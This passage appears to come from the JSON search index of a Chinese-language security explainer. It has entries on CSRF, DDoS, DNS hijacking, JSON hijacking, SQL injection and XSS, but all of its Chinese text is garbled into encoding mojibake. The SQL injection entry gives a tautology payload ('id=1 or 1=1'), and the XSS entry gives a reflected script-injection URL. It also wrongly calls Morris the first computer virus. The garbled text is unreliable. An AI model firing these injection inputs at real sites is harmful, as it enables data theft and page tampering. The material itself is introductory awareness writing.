çš„\"ç‚¹å¼€é“¾æ¥å¹¶è½¬å‘10ä¸ªç¾¤å³å¯é¢†å–100å…ƒç°é‡‘çº¢åŒ…\"ç­‰ç­‰â€¦ è¿™äº›åªæ˜¯CSRFæ”»å‡»çš„å†°å±±ä¸€è§’ï¼Œé‚£CSRFæ”»å‡»åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ CSRFï¼ˆè·¨ç«™åŸŸè¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»è™½ç„¶åªæ˜¯ä¸€ç§æä¸ºæ™®é€šçš„æ”»å‡»æ–¹å¼ï¼Œ ä½†æ˜¯å®ƒè¦†ç›–é¢æå¹¿ï¼Œè€Œä¸”å¤§éƒ¨åˆ†äººé˜²èŒƒæ„è¯†è–„å¼±ï¼Œå¯¼è‡´å®ƒæµè¡Œäº†10å¤šå¹´ï¼Œä»ç„¶ç»ä¹…ä¸è¡°ã€‚ å®ƒæ ¸å¿ƒæ€æƒ³åœ¨äºï¼Œç”¨æˆ·åœ¨æ‰“å¼€Aç½‘ç«™çš„æƒ…å†µä¸‹ï¼Œå¦‚æœåœ¨Tabé¡µé¢æ‰“å¼€äº†è¢«CSRFæ”»å‡»è¿‡çš„æ¶æ„ç½‘ç«™Bï¼Œ é‚£æ­¤æ—¶åœ¨Bé¡µé¢çš„\"å”†ä½¿\"ä¸‹ï¼Œç”¨æˆ·è‡ªèº«æµè§ˆå™¨ä¼šå‘èµ·ä¸€ä¸ªå¯¹ç½‘ç«™Açš„HTTPè¯·æ±‚ã€‚ è¿™ä¹ˆä¸€å¬å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆå‰å®³çš„ï¼Œæ™®æ™®é€šé€šï¼Œ ä½†æ˜¯CSRFæ”»å‡»æœ€è‡´å‘½çš„ä¸€ç‚¹æ˜¯ï¼š è¿™ä¸ªHTTPè¯·æ±‚ä¸æ˜¯ç”¨æˆ·çš„ä¸»åŠ¨æ„å›¾ï¼Œè€Œæ˜¯Bç½‘é¡µ\"å”†ä½¿\"çš„ï¼Œ å¦‚æœæ˜¯ä¸€ä¸ªå±å®³è¾ƒå¤§çš„è¯·æ±‚æ“ä½œï¼ˆæ¯”å¦‚å‘é‚®ä»¶ï¼Ÿåˆ æ•°æ®ï¼Ÿä¼ªé€ ä¿¡æ¯è´·æ¬¾ï¼Ÿç­‰ç­‰ï¼‰é‚£å°±éº»çƒ¦äº†ã€‚ å…¶æ¬¡ï¼Œå› ä¸ºåœ¨æ”»å‡»ä¹‹å‰ç”¨æˆ·å·²ç»æ‰“å¼€äº†Aç½‘ç«™ï¼Œ æµè§ˆå™¨ä¼šå­˜æœ‰Aç½‘ç«™ä¸‹å‘çš„Cookieæˆ–å…¶ä»–ç”¨äºèº«ä»½è®¤è¯çš„ä¿¡æ¯ï¼Œ è¿™æ¬¡è¢«\"å”†ä½¿\"çš„è¯·æ±‚ï¼Œå°†ä¼šè‡ªåŠ¨å¸¦ä¸Šè¿™äº›ä¿¡æ¯ï¼Œ å¯¼è‡´Aç½‘ç«™åç«¯åˆ†ä¸æ¸…æ¥šè¿™æ˜¯å¦æ˜¯ç”¨æˆ·çœŸå®çš„æ„æ„¿è¿˜æ˜¯\"ä¼ªè¯·æ±‚\"ã€‚ éšç€ç”¨æˆ·è¢«\"å”†ä½¿\"æ—¶é—´çš„å»¶é•¿ï¼Œè¿™äº›ç±»ä¼¼è •è™«çš„æ¶æ„è¯·æ±‚ä¼šä¸€æ­¥ä¸€æ­¥æŒ–ç©ºä½ çš„ä¿¡æ¯ï¼Œä¸¥é‡çš„å¯èƒ½å¼•å¯¼Aç½‘ç«™ç›´æ¥è½¬è´¦ã€‚ è¿™ä¹Ÿå°±ä¸éš¾ç†è§£ä¸ºä½•å¾ˆå¤šè¢«CSRFæ”»å‡»åˆ°çš„äººæ˜æ˜ä»€ä¹ˆéƒ½æ²¡åšï¼Œåªæ˜¯ç‚¹å¼€äº†é“¾æ¥ï¼Œé’±å°±å¤±è¸ªäº†ã€‚ å½“ä½ æ‰“å¼€æ‰‹æœºï¼Œåœ¨æœç´¢æ è¾“å…¥ä½ æƒ³æœç´¢çš„å†…å®¹ï¼ŒæŒ‰ä¸‹å›è½¦çš„é‚£ä¸€åˆ»å¼€å§‹ï¼Œ ä½ çš„ä¸Šç½‘ä¿¡æ¯å·²ç»æ±‡æŠ¥ç»™ç½‘ç»œç®¡ç†è€…ï¼ˆæ³¨ï¼šå±äºåˆæ³•è¡Œä¸ºï¼Œå®˜æ–¹åªæ”¶é›†ä½ çš„ç½‘å€ï¼Œå¯¹ä½ è¿›è¡Œä¸Šç½‘ä¿æŠ¤ï¼‰ ä½†å¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½è¿™ä¹ˆåšï¼Œæ›´å¤šçš„æƒ…å†µæ˜¯æ”»å‡»è€…ä¼šç›‘æ§ä½ çš„ä¸€ä¸¾ä¸€åŠ¨ï¼Œ è·å–ä½ çš„ä¸ªäººä¿¡æ¯åè½¬å–ç»™æŸäº›éæ³•ç»„ç»‡æˆ–éæ³•ç›ˆåˆ©æœºæ„ã€‚ ä½†è¿™ç§ç±»å‹çš„ç½‘ç«™ä¹Ÿå¾ˆå¥½åˆ†è¾¨ï¼Œç»†å¿ƒçš„äººä¼šå‘ç°ï¼Œæœ‰äº›ç½‘å€å¼€å¤´æ˜¯httpï¼Œæœ‰äº›æ˜¯httpsã€‚ http è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ˜æ–‡çš„æ–¹å¼ä¼ è¾“æ•°æ®ã€‚ https å®‰å…¨å¥—ç»“å­—å±‚è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œå³åŠ å¯†ä¼ è¾“æ•°æ®ã€‚ æ‰€ä»¥å½“ä½ åœ¨httpå¼€å¤´çš„ç½‘ç«™ä¸Šè¾“å…¥æ”¯ä»˜å¯†ç ã€èº«ä»½è¯å·ã€é“¶è¡Œå¡ç­‰ç­‰é‡è¦ä¿¡æ¯çš„æ—¶å€™ï¼Œ æ”»å‡»è€…é€šè¿‡æˆªè·æ˜æ–‡æ•°æ®ï¼Œè¿™äº›å†…å®¹å°†ç›´æ¥æ³„æ¼ç»™æ”»å‡»è€…ã€‚ å°±å¥½æ¯”ä½ åœ¨é“¶è¡ŒATMæœºå­˜é’±çš„æ—¶å€™ï¼Œè¾“å…¥å¡å·å’Œå¯†ç çš„åŒæ—¶è¢«ATMæœºæ˜æ–‡å¹¿æ’­ã€‚ å°½ç®¡ç»†æ€ææï¼Œä½†ç»ä¸æ˜¯åœ¨å¤¸å¤§å…¶è¾ï¼Œåœ¨ç½‘ç»œæ”»å‡»è€…çœ‹æ¥ï¼Œåªæ˜¯è¾“å…¥å‡ è¡Œå‘½ä»¤é‚£ä¹ˆç®€å•çš„äº‹ã€‚ ä¸è¿‡ç›®å‰å¤§éƒ¨åˆ†ç½‘ç«™éƒ½å·²ç»é‡‡ç”¨httpsåŠ å¯†ä¼ è¾“åè®®ï¼Œ é™¤äº†æŸäº›å¢ƒå¤–çš„\"å­¦ä¹ ç½‘ç«™\"å’Œå°‘æ•°æ ‡è®°ä¸ºå¹¿å‘Šçš„ç½‘ç«™ä»åœ¨é‡‡ç”¨httpåè®®ï¼ˆå…·ä½“åŸå› ä¸ç”¨æˆ‘å¤šè¯´äº†å§ï¼‰","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-CSRF-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-CSRF-attack.html"},{"title":"DDoSæ”»å‡»","text":"DDoSå…¨ç§°æ˜¯åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDistributed Denial of Serviceï¼‰, å±äºæ˜¯æœ€æ²¡æŠ€æœ¯å«é‡ä½†æ”»å‡»èµ·æ¥æœ€è®©äººå¤´ç–¼çš„ä¸€ç§ã€‚æ”»å‡»è€…ä¸æ–­åœ°æå‡ºæœåŠ¡è¯·æ±‚ï¼Œ è®©åˆæ³•ç”¨æˆ·çš„è¯·æ±‚æ— æ³•åŠæ—¶å¤„ç†ï¼Œè¿™æ˜¯ DoS æ”»å‡»ã€‚ è€ŒDDoS æ”»å‡»æ˜¯æ”»å‡»è€…ä½¿ç”¨å¤šå°è®¡ç®—æœºæˆ–è€…è®¡ç®—æœºé›†ç¾¤è¿›è¡Œ DoS æ”»å‡» è¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯ä¸€ä¸ªäººå»é¥­åº—åƒé¥­ï¼Œ ç‚¹äº†99999999999+ä¸ªèœï¼Œç„¶åè¿™ä¸ªäººè·‘äº†ï¼Œå¨å¸ˆè¿˜åœ¨å¿™æ´»ç€ï¼Œç»“æœå¨å¸ˆç´¯æ­»äº†ã€‚ è™½ç„¶å¬èµ·æ¥å¾ˆæ— è„‘ï¼Œç”šè‡³æœ‰äº›å¥½ç¬‘ï¼Œä½†ä¸å¾—ä¸æ‰¿è®¤å®ƒç¡®å®æ˜¯å¾ˆå‰å®³ã€‚ ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªè®¡ç®—æœºç—…æ¯’Morrisçš„åŸç†å°±ä¸DDOSæ”»å‡»ç±»ä¼¼ï¼Œèµ„æºè€—å°½å¯¼è‡´æœåŠ¡å™¨æ­»æœºã€‚ æ­¤åï¼Œæ¶ˆè€—èµ„æºçš„æ”»å‡»çš„æ€ç»´é¦–æ¬¡è¢«ä¸€åé»‘å®¢åº”ç”¨äºé‚®ä»¶ï¼Œå¯¼è‡´å½“æ—¶å¤šè¾¾æ•°ä¸‡ä»½é‚®ä»¶åœæ»ã€‚ 2007å¹´åœ¨çˆ±æ²™å°¼äºšæˆ˜äº‰ä¸­é¦–æ¬¡å¤§è§„æ¨¡ä½¿ç”¨DDOSæ”»å‡»ï¼Œå¯¼è‡´çˆ±æ²™å°¼äºšä¸€æ•´ä¸ªå›½å®¶åœ¨äº’è”ç½‘ä¸Šé”€å£°åŒ¿è¿¹ã€‚ 2008å¹´çš„æ ¼é²å‰äºšæˆ˜äº‰ï¼ŒDDOSæ”»å‡»åˆå¯¼è‡´è¯¥å›½ç½‘ç»œå…¨çº¿ç˜«ç—ªã€‚ è€Œåœ¨2018å¹´ï¼Œä¸€å¢ƒå¤–é»‘å®¢ç»„ç»‡å‘åŠ¨äº†è¿„ä»Šä¸ºæ­¢ä¸–ç•Œä¸Šè§„æ¨¡æœ€å¤§çš„DDOSæ”»å‡»ï¼Œ æ”»å‡»ç›®æ ‡æ˜¯GitHubã€‚ åœ¨æ”»å‡»æœ€é«˜å³°æ—¶ï¼Œæ­¤æ”»å‡»ä»¥æ¯ç§’1.3Tbpsçš„é€Ÿç‡ä¼ è¾“æµé‡ï¼Œ ä»¥æ¯ç§’1.269äº¿çš„é€Ÿç‡å‘é€æ•°æ®åŒ…ã€‚ å¹¸è¿çš„æ˜¯ï¼ŒGitHubçš„DDoSä¿æŠ¤æœºåˆ¶è®©GitHubå®‰å…¨äººå‘˜å¿«é€Ÿé˜²å¾¡ï¼Œæœ‰æ•ˆçš„é˜»æ­¢äº†è¿™æ¬¡å¤§è§„æ¨¡æ”»å‡»ã€‚ æŠ€æœ¯ä»æ¥éƒ½æ˜¯ä¸€æŸ„åŒåˆƒå‰‘ï¼Œåˆ†å¸ƒå¼æŠ€æœ¯æ—¢å¯ä»¥ç”¨æ¥æä¾›é«˜å¯ç”¨çš„æœåŠ¡ï¼Œ ä¹Ÿèƒ½å¤Ÿè¢«æ”»å‡»è€…ç”¨æ¥è¿›è¡Œå¤§è§„æ¨¡æ€ä¼¤æ€§æ”»å‡»ã€‚ æ”»å‡»è€…ä¸å†å±€é™äºå•å°è®¡ç®—æœºçš„æ”»å‡»èƒ½åŠ›ï¼Œ è½¬è€Œé€šè¿‡æˆè§„æ¨¡çš„ç½‘ç»œé›†ç¾¤å‘èµ·æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ è¿™ç§è§„æ¨¡æ”»å‡»è¶³ä»¥è®©ä¸€ä¸ªå›½å®¶ç½‘ç»œå—åˆ°æ¯ç­æ€§æ‰“å‡»ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-DDOS-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-DDOS-attack.html"},{"title":"DNSåŠ«æŒ","text":"å½“ä»Šäº’è”ç½‘æµé‡ä¸­ï¼Œä»¥HTTPï¼HTTPSä¸ºä¸»çš„WebæœåŠ¡äº§ç”Ÿçš„æµé‡å æ®äº†ç»å¤§éƒ¨åˆ†ï¼Œ æ¯”å¦‚æŠ–éŸ³ã€å¿«æ‰‹ã€çˆ±å¥‡è‰ºã€ä¼˜é…·ç­‰ç­‰æ›´ä¸ºçªå‡ºã€‚WebæœåŠ¡å‘å±•å¦‚æ­¤è¿…çŒ›ï¼Œ è¿™èƒŒåç¦»ä¸å¼€ä¸€ä¸ªé»˜é»˜æ— é—»çš„å¤§åŠŸè‡£å°±æ˜¯åŸŸåè§£æç³»ç»ŸDNSã€‚ å¦‚æœæ²¡æœ‰DNSï¼Œæˆ‘ä»¬ä¸Šç½‘éœ€è¦è®°å¿†æ¯ä¸ªç½‘ç«™çš„IPåœ°å€è€Œä¸æ˜¯ä»–ä»¬çš„åŸŸåï¼Œ è¿™ç®€ç›´æ˜¯ç¾éš¾ï¼Œå¥½åœ¨DNSé»˜é»˜åœ¨èƒŒååšäº†è¿™ä¸€åˆ‡ï¼Œæˆ‘ä»¬åªéœ€è¦è®°ä½ä¸€ä¸ªåŸŸåï¼Œå‰©ä¸‹çš„äº¤ç»™DNSæ¥å®Œæˆå§ã€‚ ä¹Ÿæ­£æ˜¯å› ä¸ºå…¶é‡è¦æ€§ï¼Œåˆ«æœ‰ç”¨å¿ƒçš„äººè‡ªç„¶æ˜¯ä¸ä¼šæ”¾è¿‡å®ƒï¼ŒDNSåŠ«æŒæŠ€æœ¯åˆè¢«å‘æ˜äº†å‡ºæ¥ã€‚ çœ‹åˆ°è¿™æ˜¯ä¸æ˜¯æƒ³åæ§½ä¸€å¥ï¼šæ€ä¹ˆä»€ä¹ˆä¸œè¥¿éƒ½èƒ½å½“ç½‘ç»œæ”»å‡»æ‰‹æ®µå•Šï¼Ÿ æ²¡é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´è¦äº†è§£è¿™äº›å†…å®¹ï¼Œæé«˜è‡ªèº«çš„é˜²èŒƒæ„è¯†ï¼Œæˆ‘ä»¬æ¥ç€è¯´DNSåŠ«æŒã€‚ DNSæä¾›æœåŠ¡æœ€åˆæ˜¯ç”¨æ¥å°†åŸŸåè½¬æ¢æˆIPåœ°å€ï¼Œ ç„¶è€Œåœ¨æ—©æœŸåè®®çš„è®¾è®¡ä¸­å¹¶æ²¡æœ‰å¤ªå¤šè€ƒè™‘å…¶å®‰å…¨æ€§ï¼Œæ‰€ä»¥å¯¹äºæŸ¥è¯¢æ–¹çš„æˆ‘ä»¬æ¥è¯´ä¼šäº§ç”Ÿè¯¸å¤šç–‘é—®ï¼š æˆ‘å»è¯·æ±‚çš„çœŸçš„æ˜¯ä¸€ä¸ªDNSæœåŠ¡å™¨å—ï¼Ÿ ç¡®å®šä¸æ˜¯åˆ«äººå†’å……çš„ï¼Ÿ æŸ¥è¯¢çš„ç»“æœæœ‰æ²¡æœ‰è¢«äººç¯¡æ”¹è¿‡ï¼Ÿ è¿™ä¸ªIPçœŸæ˜¯è¿™ä¸ªç½‘ç«™çš„å—ï¼Ÿ é—æ†¾çš„æ˜¯DNSåè®®ä¸­æ²¡æœ‰æœºåˆ¶å»ä¿è¯èƒ½å›ç­”è¿™äº›é—®é¢˜ï¼Œå› æ­¤DNSåŠ«æŒç°è±¡éå¸¸æ³›æ»¥ï¼Œ ä»ç”¨æˆ·åœ¨åœ°å€æ è¾“å…¥ä¸€ä¸ªåŸŸåçš„é‚£ä¸€åˆ»èµ·ï¼Œ ä¸€è·¯ä¸Šçš„å‡¶é™©é˜²ä¸èƒœé˜²ï¼Œå¥½æ¯”å”åƒ§ç‹¬è‡ªå»è¥¿å¤©å–ç»ï¼Œç®€ç›´å°±æ˜¯å°æ¯ç‰›åç”µçº¿â€”â€”ç‰›Xå¸¦é—ªç”µã€‚ åæ¥ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‡ºç°äº†DNSSECæŠ€æœ¯ï¼Œ ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥è§£å†³ä¸Šé¢çš„éƒ¨åˆ†é—®é¢˜ã€‚ä½†é™äºä¸€äº›æ–¹é¢çš„åŸå› ï¼Œ è¿™é¡¹æŠ€æœ¯å¹¶æ²¡æœ‰å¤§è§„æ¨¡ä½¿ç”¨ï¼Œå°¤å…¶åœ¨å›½å†…ï¼Œé²œæœ‰éƒ¨ç½²åº”ç”¨ã€‚ å†åæ¥ï¼Œä»¥é˜¿é‡Œã€è…¾è®¯ç­‰å¤´éƒ¨äº’è”ç½‘å‚å•†ä¸ºé¦–å¼€å§‹æ¨å‡ºäº†httpDNSæœåŠ¡ï¼Œ æ¥äº†ä¸€æ‹›é‡œåº•æŠ½è–ªï¼Œè™½ç„¶è¿™é¡¹æŠ€æœ¯çš„åå­—ä¸­è¿˜æœ‰DNSä¸‰ä¸ªå­—æ¯ï¼Œ ä½†å®ç°ä¸Šå’ŒåŸæ¥ä½†DNSå·²ç»æ˜¯å¤©å·®åœ°åˆ«ï¼Œ é€šè¿‡è¿™é¡¹æŠ€æœ¯è®©DNSå˜æˆäº†åœ¨httpåè®®ä¹‹ä¸Šçš„ä¸€ä¸ªåº”ç”¨æœåŠ¡ã€‚ æ‰€ä»¥ç°åœ¨å›½å†…ç½‘ç«™åŸºæœ¬å¾ˆå°‘ä¼šé‡åˆ°DNSåŠ«æŒçš„äº‹ä»¶ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-DNS-hijacking.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-DNS-hijacking.html"},{"title":"JSONåŠ«æŒ","text":"JSONæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œ è€ŒåŠ«æŒå°±æ˜¯å¯¹æ•°æ®è¿›è¡Œçªƒå–ï¼ˆæˆ–è€…åº”è¯¥ç§°ä¸ºæ‰“åŠ«ã€æ‹¦æˆªæ¯”è¾ƒåˆé€‚ï¼‰ã€‚ æ¶æ„æ”»å‡»è€…é€šè¿‡æŸäº›ç‰¹å®šçš„æ‰‹æ®µï¼Œå°†æœ¬åº”è¯¥è¿”å›ç»™ç”¨æˆ·çš„JSONæ•°æ®è¿›è¡Œæ‹¦æˆªï¼Œ è½¬è€Œå°†æ•°æ®å‘é€å›ç»™æ¶æ„æ”»å‡»è€…ã€‚ å¦‚æœè¯´å‰é¢é‚£å‡ ä¸ªå“¥ä»¬æ˜¯æŠŠä½ æ‰“åŠ«çš„å•¥éƒ½ä¸å‰©ï¼Œ é‚£JSONåŠ«æŒå°±çœ‹èµ·æ¥\"æ¸©æŸ”\"è®¸å¤šï¼Œ å®ƒåªæ‰“åŠ«é‚£äº›æ•æ„Ÿä¿¡æ¯æˆ–è€…æœ‰ä»·å€¼çš„æ•°æ®ã€‚ JSONæ¼æ´ä¸»è¦è¢«æ”»å‡»è€…ç”¨åœ¨å—å®³è€…ä¸çŸ¥ä¸è§‰ä¸­çªƒå–ä»–ä»¬çš„éšç§æ•°æ®ï¼Œ å¸¸å¸¸è¢«ä¸€äº› APT ç»„ç»‡é‡‡ç”¨è¿›è¡Œä¿¡æ¯æ”¶é›†å’Œé’“é±¼çš„å·¥ä½œ( ä¹Ÿç§°æ°´å‘æ”»å‡» ) ç®€å•æ¥è¯´å°±æ˜¯å°å·è¿›åˆ°å¼ ä¸‰å®¶é‡Œï¼Œä»–ä¸ä¼šå‚»åˆ°æŠŠæ²™å‘æŸœå­æ¬èµ°ï¼Œ ä»–é€‰æ‹©æ‹¿é‡‘å±æ¢æµ‹ä»ªæ‰«æï¼Œåªå¸¦é‡‘å±ç±»çš„ä¸œè¥¿ï¼Œæ‹¿ç›¸å¯¹ä»·å€¼æœ€é«˜çš„ä¸œè¥¿èµ°ã€‚ é‚£æœ‰äººå°±å¥½å¥‡ï¼Œæœ‰ä»·å€¼çš„æ•°æ®æ— éå°±æ˜¯å§“åï¼Œ æ‰‹æœºå·ï¼Œèº«ä»½è¯å·ï¼Œemailé‚®ç®±ï¼Œä»¥åŠä¸€äº›ç½‘ç«™çš„ç™»å½•å¯†ç ï¼Œè¿˜èƒ½æœ‰ä»€ä¹ˆå‘¢ï¼Ÿ Cookiesï¼Œç®€å•æ¥è¯´å°±æ˜¯æ”»å‡»è€…ç™»å½•ä½ çš„è´¦å·ä¸ä¸€å®šè¦ç”¨å¯†ç ç™»å½•ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©Cookiesç›´æ¥è¿›å…¥è´¦æˆ·ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œå®ƒç”šè‡³å¯ä»¥æ˜¯ CSRF Token ä¿¡æ¯ï¼Œå‰é¢è°ˆè¿‡CSRFæ”»å‡»ï¼Œ ä¸€å®šè¿˜æœ‰å°è±¡å§ï¼Œå¯ä»¥è¯´CSRF Token å°±æ˜¯é˜²å¾¡çš„CSRFæ”»å‡»çš„å±éšœï¼Œä»å†…éƒ¨ç“¦è§£æ‰æ˜¯æœ€ä»¤äººææ€–çš„ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-Json-hijacking.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-Json-hijacking.html"},{"title":"SQLæ³¨å…¥","text":"SQLæ³¨å…¥æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„ä¸€ç§æ•°æ®åº“æ”»å‡»æ‰‹æ®µï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨çš„æ‰€æœ‰ç½‘ç«™ï¼Œ è½¯ä»¶éƒ½ä¼šç”¨åˆ°æ•°æ®åº“ï¼Œåªè¦æœ‰æ•°æ®åº“å­˜åœ¨çš„åœ°æ–¹å°±å¯èƒ½å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚ SQLæ³¨å…¥æ”»å‡»çš„æ ¸å¿ƒåœ¨äºè®©WebæœåŠ¡å™¨æ‰§è¡Œæ”»å‡»è€…æœŸæœ›çš„SQLè¯­å¥ï¼Œ ä»¥ä¾¿å¾—åˆ°æ•°æ®åº“ä¸­çš„æ„Ÿå…´è¶£çš„æ•°æ®æˆ–å¯¹æ•°æ®åº“è¿›è¡Œè¯»å–ã€ä¿®æ”¹ã€åˆ é™¤ã€æ’å…¥ç­‰æ“ä½œï¼Œè¾¾åˆ°å…¶é‚ªæ¶çš„ç›®çš„ã€‚ è€Œå¦‚ä½•è®©WebæœåŠ¡å™¨æ‰§è¡Œæ”»å‡»è€…çš„SQLè¯­å¥å‘¢ï¼Ÿ SQLæ³¨å…¥çš„å¸¸è§„å¥—è·¯åœ¨äºå°†SQLè¯­å¥æ”¾ç½®äºFormè¡¨å•æˆ–è¯·æ±‚å‚æ•°ä¹‹ä¸­ï¼ˆæ¯”å¦‚è¯´SELECTã€DROPç­‰ç­‰ï¼‰ æäº¤åˆ°åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¦‚æœæœªåšè¾“å…¥å®‰å…¨æ ¡éªŒï¼Œç›´æ¥å°†å˜é‡å–å‡ºè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œåˆ™ææ˜“ä¸­æ‹›ã€‚ ä¸¾ä¸ªç®€å•çš„SQLæ³¨å…¥ä¾‹å­ å¯¹äºä¸€ä¸ªæ ¹æ®ç”¨æˆ·IDè·å–ç”¨æˆ·ä¿¡æ¯çš„æ¥å£ï¼Œåç«¯çš„SQLè¯­å¥ä¸€èˆ¬æ˜¯è¿™æ ·: select name,[...] from t_user whereid=$id å…¶ä¸­ï¼Œ$idå°±æ˜¯å‰ç«¯æäº¤çš„ç”¨æˆ·idï¼Œé‚£å‰ç«¯çš„è¯·æ±‚å¦‚æœæ˜¯è¿™æ ·: GET xx/userinfo?id=1%20or%201=1 è¯·æ±‚å‚æ•°idè½¬ä¹‰åå°±æ˜¯1 or 1=1ï¼Œå¦‚æœåç«¯ä¸åšå®‰å…¨è¿‡æ»¤ç›´æ¥æäº¤æ•°æ®åº“æŸ¥è¯¢ï¼ŒSQLè¯­å¥å°±å˜æˆäº†: select name,[...] from t_user where id=1 or 1=1 æœ€ç»ˆç»“æœå°±æ˜¯æŠŠç”¨æˆ·è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®å…¨éƒ¨æŸ¥å‡ºï¼Œå·²ç»è¾¾åˆ°äº†æ”»å‡»è€…æ³„éœ²æ•°æ®çš„ç›®çš„ ä¸Šé¢åªæ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ³¨å…¥ç¤ºä¾‹ï¼Œåœ¨çœŸå®çš„SQLæ³¨å…¥æ”»å‡»ä¸­å‚æ•°æ„é€ å’ŒSQLè¯­å¥è¿œæ¯”è¿™å¤æ‚å¾—å¤šï¼Œ æ”»å‡»è€…æ”»å‡»çš„ä½ç½®ä¹Ÿå¤æ‚çš„å¤šï¼Œä¸è¿‡åŸç†æ˜¯ä¸€è‡´çš„ã€‚å¤æ‚åº¦æå‡äº§ç”Ÿçš„æ”»å‡»æ•ˆæœå¯æƒ³è€ŒçŸ¥ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-SQL-injection.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-SQL-injection.html"},{"title":"XSS æ”»å‡»","text":"XSSå…¨ç§°æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross Site Scriptingï¼‰ï¼Œ ä¸ºäº†å’Œé‡å æ ·å¼è¡¨CSSåŒºåˆ†ï¼Œæ¢äº†å¦ä¸€ä¸ªç¼©å†™XSSã€‚ ç®€å•æ¥è¯´å°±æ˜¯æŸé¥­åº—è¦è¿›ä¸€æ‰¹é…¸èœï¼Œå¼ ä¸‰åœ¨é€è´§è½¦å¿«åˆ°é¥­åº—çš„æ—¶å€™ï¼Œ å·å·ä¸Šè½¦æŠŠåŸæ¥çš„é…¸èœæ¢æˆäº†\"è€å›é…¸èœ\"ï¼Œ éšåè€å›é…¸èœ\"è¢«æ”¾å…¥é¥­åº—ä»“åº“ã€‚ æ­¤ååªè¦æœ‰äººæ¥é¥­åº—åƒé…¸èœé±¼ï¼Œå°±ä¼šè¢«\"ç¾å‘³\"æ”»å‡»ï¼Œè®©ç”¨æˆ·æ¯«ä¸çŸ¥æƒ…çš„è¸©å‘ XSSæ”»å‡»çš„æ ¸å¿ƒæ˜¯å°†å¯æ‰§è¡Œçš„å‰ç«¯è„šæœ¬ä»£ç ï¼ˆä¸€èˆ¬ä¸ºJavaScriptï¼‰æ¤å…¥åˆ°ç½‘é¡µä¸­ï¼Œ é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œ æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚ è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œ ä½†ä¹Ÿå­˜åœ¨Javaã€ VBScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLä»£ç ã€‚ ä¸€æ—¦æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°ä¸€äº›ç”¨æˆ·æˆ–ç®¡ç†å‘˜æƒé™ï¼ˆæƒé™ä¸Šä¸å°é¡¶ï¼‰ é‚£æˆ‘ä»¬æ¥èŠèŠæ”»å‡»è€…æ˜¯å¦‚ä½•åŠåˆ°çš„å‘¢ï¼Ÿ ä¸€èˆ¬XSSæ”»å‡»åˆ†ä¸ºä¸¤ç§ï¼šåå°„å‹å’Œå­˜å‚¨å‹ åå°„å‹ æ”»å‡»è€…å°†JSä»£ç ä½œä¸ºè¯·æ±‚å‚æ•°æ”¾ç½®URLä¸­ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œè½å…¥é™·é˜±. æ¯”å¦‚, æ”»å‡»è€…é¦–å…ˆå°†JSä»£ç ä½œä¸ºè¯·æ±‚å‚æ•°æ”¾ç½®URLä¸­ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»: http://localhost:8080/test?name=<script>alert(\"å—¨å®³å—¨ï¼Œä½ å·²ç»è¢«æ”»å‡»äº†!\")</script> ç­‰ç”¨æˆ·ç‚¹å‡»åï¼Œè¯¥JSå°±ä¼šä½œä¸ºè¯·æ±‚å‚æ•°ä¼ ç»™WebæœåŠ¡å™¨åç«¯ã€‚ å¦‚æœåç«¯æœåŠ¡å™¨æ²¡æœ‰å¾ˆå®Œå–„çš„æ£€æŸ¥è¿‡æ»¤ï¼Œ å°±ä¼šç®€å•å¤„ç†åæ”¾å…¥ç½‘é¡µæ­£æ–‡ä¸­è¿”å›ç»™æµè§ˆå™¨ï¼Œ ç­‰æµè§ˆå™¨è§£æè¿”å›çš„ç½‘é¡µåï¼Œç”¨æˆ·å·²ç»ä¸­æ‹›äº†ï¼ 